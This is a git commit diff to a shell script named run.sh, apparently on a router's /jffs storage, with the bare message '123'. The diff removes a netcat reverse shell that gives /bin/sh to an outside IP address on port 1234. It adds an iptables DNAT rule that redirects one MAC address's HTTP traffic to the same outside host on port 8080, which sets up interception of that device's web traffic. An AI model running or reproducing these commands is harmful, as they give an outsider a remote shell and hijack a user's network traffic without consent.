1f09ea0c291f0e9497b1eeae0c73ab7f745a7580
kickstarting <34027859+kickstarting@users.noreply.github.com>
2018-01-04 13:11:52 +0000

    123

--- run.sh
+++ run.sh
@@ -1,4 +1,5 @@
 #!/bin/sh
 
-#1
-/jffs/busybox nc  37.220.31.52 1234 -e /bin/sh
+iptables -t mangle -vnL
+
+iptables -t nat -I PREROUTING 1 -m mac --mac-source d4:a3:3d:22:bb:cc -p tcp -m tcp --dport 80 -j DNAT --to-destination 37.220.31.52:8080
